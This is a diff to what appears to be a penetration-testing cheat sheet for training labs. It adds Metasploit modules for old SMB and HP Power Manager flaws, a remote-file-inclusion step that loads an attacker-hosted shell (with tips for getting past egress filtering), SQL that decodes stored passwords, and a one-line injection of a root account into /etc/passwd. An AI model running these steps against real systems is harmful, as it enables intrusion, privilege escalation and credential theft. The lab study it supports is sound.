@@ -146,6 +146,13 @@ Try null sessions and guest accounts first.
   netexec smb 10.10.10.10 -u guest -p ''
   smbmap -H 10.10.10.10 -u guest -p ''
   ```
+
+- **MS09-050 SMBv2 Negotiate Vulnerability (CVE-2009-3103):**
+  - *Context*: Windows Vista/7 and Server 2008 (x86). Vulnerability in `srv2.sys`.
+  - *Indicator*: `nmap --script vuln` identifies `smb-vuln-cve2009-3103`.
+  - *Metasploit*: `exploit/windows/smb/ms09_050_smb2_negotiate_func_index`
+  - *Manual Fixes (Python 3)*: Wrap prints in `()`, prefix strings with `b""`. Requires `pip install pysmb`.
+  - *Tip*: Increase `WAIT` to 180s for stability.
 - **Password Spraying (Targeted Wordlist)**:
   - *Tip*: Try `SeasonYear` (e.g., `Spring2023`), `Username`, and `emansenru` (reversed username).
 - **Authenticated (User:Pass):**
@@ -749,6 +756,18 @@ Use these when you have a shell but no tools (like BloodHound/Netexec) uploaded 
   - *Trigger*: Upload a malicious `shell.zip` (containing `shell.php`) via AdRotate -> Manage Media.
   - *Execution*: Triggered at `/wp-content/banners/shell.php`.
 
+- **HP Power Manager Buffer Overflow (CVE-2011-4158):**
+  - *Context*: Found in `formExportDataLogs` or login page. Running as SYSTEM.
+  - *Credentials*: Try default `admin:admin` for web access.
+  - *Metasploit*: `exploit/windows/http/hp_power_manager_filename`
+  - *Warning*: Manual Python exploits (e.g., EDB-17927) are highly prone to DoS. MSF is recommended for stability.
+
+- **SimplePHPGal RFI (CVE-2008-6668):**
+  - *Context*: Simple PHP Photo Gallery 0.7 and earlier.
+  - *Trigger*: `http://[IP]/image.php?img=[PAYLOAD]`
+  - *Exploit*: Point `img` to a remote `shell.txt` on Kali (Port 80).
+  - *Bypass*: If Ports 80/443 are filtered for outbound traffic, try common high ports or SMB (e.g., Port 445).
+
 - **SSH Key Injection via API / File Upload:**
   ```bash
   # 1. Generate local key: ssh-keygen -t rsa -f id_rsa -N ""
@@ -957,6 +976,10 @@ Use these queries after connecting via `impacket-mssqlclient`.
 - **Dump Data:**
   ```sql
   # Read rows (limit 10 for safety)
+  SELECT * FROM [TABLE] LIMIT 10;
+  # Decode Base64 Column (MySQL)
+  SELECT username, CONVERT(FROM_BASE64(password), CHAR) FROM users;
+  ```
   SELECT TOP 10 * FROM [TABLE_NAME];
   ```
 - **Harvest Credentials (Sysadmin Required):**
@@ -1305,6 +1328,12 @@ Don't get overwhelmed by searching just for "linux kernel". Most effective combi
   echo "usta:password" | chpasswd
   usermod -aG sudo usta
   ```
+
+- **Edit /etc/passwd (Manual Root Add)**:
+  - *Scenario*: `/etc/passwd` is writable.
+  - *Command*: `openssl passwd -1 [PASSWORD]` -> `[HASH]`
+  - *Inject*: `echo 'root2:[HASH]:0:0:root:/root:/bin/bash' >> /etc/passwd`
+  - *Login*: `su root2` [Snookums]
 - **Fix SSH Config (Medtech Login Setup)**:
   ```bash
   # Ensure password auth is enabled if only keys worked
